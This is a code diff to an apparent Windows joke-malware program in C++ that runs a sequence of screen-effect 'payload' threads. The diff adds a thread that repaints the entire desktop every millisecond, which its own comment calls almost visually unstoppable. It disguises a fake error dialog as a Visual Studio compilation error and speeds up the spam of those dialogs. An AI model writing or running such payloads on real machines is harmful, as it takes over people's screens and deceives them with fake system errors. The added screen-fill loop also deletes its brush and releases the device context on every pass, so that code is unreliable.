@@ -3,6 +3,8 @@
 #include <windowsx.h>
 #pragma comment(lib, "winmm.lib")
 
+#pragma comment( user, "Compiled on " __DATE__ " at " __TIME__ )
+
 //#define _USE_MATH_DEFINES
 //#include <cmath>
 //#include <ctime>
@@ -255,6 +257,29 @@ void WINAPI ded(LPVOID lpVoid) {
     }
 }
 
+void WINAPI REALded(LPVOID lpVoid) {
+    // consider it as an ded v2
+
+    // basically fill the screen every 1 ms
+    // deadly, almost (visually) unstoppable
+
+    // this is why you always showld use an an VM ;)
+    HBRUSH brush = CreatePatternBrush((HBITMAP)LoadImage(NULL, L"check.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE));
+
+    HANDLE thread;
+    DWORD ID;
+
+    RECT rect;
+    HDC hdc = GetDC(0);
+    while (true) {
+        Sleep(1);
+        GetWindowRect(GetDesktopWindow(), &rect);
+        FillRect(hdc, &rect, brush);
+        DeleteObject(brush);
+        ReleaseDC(GetDesktopWindow(), hdc);
+    }
+}
+
 
 VOID WINAPI ci(int x, int y, int w, int h) // https://github.com/pankoza2-pl/GDI-and-Bytebeats/blob/main/I_Am_a_potato/Main.cpp
 {
@@ -371,7 +396,7 @@ DWORD WINAPI fun3(LPVOID lpVoid) { // https://github.com/pankoza2-pl/GDI-and-Byt
         {
             signX = 1;
         }
-        Sleep(10);
+        Sleep(1);
         DeleteObject(brush);
         brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
         SelectObject(hdc, brush);
@@ -433,7 +458,7 @@ DWORD WINAPI fun4(LPVOID lpVoid) // https://github.com/pankoza2-pl/GDI-and-Byteb
 /// @param lpstart 
 /// @return /
 DWORD WINAPI FakeError(LPVOID lpstart) {
-		MessageBoxA(0, "IndexError: list assignment index out of range", "PyMal error!",  MB_ABORTRETRYIGNORE | MB_ICONERROR);
+		MessageBoxA(0, "IndexError: list assignment index out of range", "Visual Studio Community 2017: Compilation Error!",  MB_ABORTRETRYIGNORE | MB_ICONERROR);
 	return 0x00;
 }
 
@@ -441,7 +466,7 @@ DWORD WINAPI FakeErrorSpam(LPVOID lpstart) {
 	HANDLE thread;
 	DWORD ID;
 
-    Sleep(random() % 300 + 200);
+    Sleep(random() % 30 );
 	thread = CreateThread(0, 0, FakeError, 0, 0, &ID);
 }
 
@@ -2143,7 +2168,7 @@ void startPayloads() {
 	HANDLE thread;
 	DWORD ID;
 
-    Sleep(random() % 3000 + 2400);
+    //Sleep(random() % 3000 + 2400);
 	thread = CreateThread(0, 0, FakeError, 0, 0, &ID);
 	
     Sleep(random() % 500 + 340);
@@ -2152,13 +2177,13 @@ void startPayloads() {
 
 	Sleep(random() % 5000 + 3400);
 	HANDLE dark = CreateThread(0, 0, Dark, 0, 0, &ID);
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	Sleep(random() % 4000 + 300);
 	thread = CreateThread(0, 0, Cursors, 0, 0, &ID);
 	thread = CreateThread(0, 0, Melter, 0, 0, &ID);
 	thread = CreateThread(0, 0, fun1, 0, 0, &ID);
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	Bytebeat1();
 
@@ -2172,7 +2197,7 @@ void startPayloads() {
 	
 	thread = CreateThread(0, 0, gdi1, 0, 0, &ID);
 
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	Reset();
 	Bytebeat2();
@@ -2183,7 +2208,7 @@ void startPayloads() {
 	thread = CreateThread(0, 0, Sinewave, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi17, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi18, 0, 0, &ID);
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 		
 	thread = CreateThread(0, 0, gdi2, 0, 0, &ID);
@@ -2196,7 +2221,7 @@ void startPayloads() {
 		
 	thread = CreateThread(0, 0, gdi3, 0, 0, &ID);
 
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 
 	Sleep(random() % 80000 + 7000);
@@ -2207,7 +2232,7 @@ void startPayloads() {
 	thread = CreateThread(0, 0, gdi4, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi20, 0, 0, &ID);
 
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	
 	Reset();
@@ -2218,7 +2243,7 @@ void startPayloads() {
 		
 	thread = CreateThread(0, 0, gdi5, 0, 0, &ID);
 
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 
 	Sleep(random() % 4500 + 3200);
@@ -2227,7 +2252,7 @@ void startPayloads() {
 		
 	thread = CreateThread(0, 0, gdi6, 0, 0, &ID);
 
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	
 	Sleep(random() % 24000 + 21000);
@@ -2235,7 +2260,7 @@ void startPayloads() {
 		
 	thread = CreateThread(0, 0, gdi7, 0, 0, &ID);
 
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 
 	Sleep(random() % 4000 + 2700);
@@ -2243,7 +2268,7 @@ void startPayloads() {
 		
 	thread = CreateThread(0, 0, gdi8, 0, 0, &ID);
 
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 
 	Sleep(random() % 7500 + 6400);
@@ -2256,7 +2281,7 @@ void startPayloads() {
 	thread = CreateThread(0, 0, gdi12, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi13, 0, 0, &ID);
 
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 
 	
 	Reset();
@@ -2268,7 +2293,7 @@ void startPayloads() {
 		
 	thread = CreateThread(0, 0, gdi10, 0, 0, &ID);
 
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	Reset();
 	Bytebeat5();
@@ -2282,12 +2307,15 @@ void startPayloads() {
 	thread = CreateThread(0, 0, gdi16, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi21, 0, 0, &ID);
 
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 
 	CloseHandle(thread);
 
 	Sleep(random() % 4000 + 3000);
 
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)REALded, 0, 0, &ID);
+    thread = CreateThread(0, 0, FakeErrorSpam, 0, 0, &ID);
+    Sleep(random() % 4000 + 3000);
 	//startPayloads();
 }
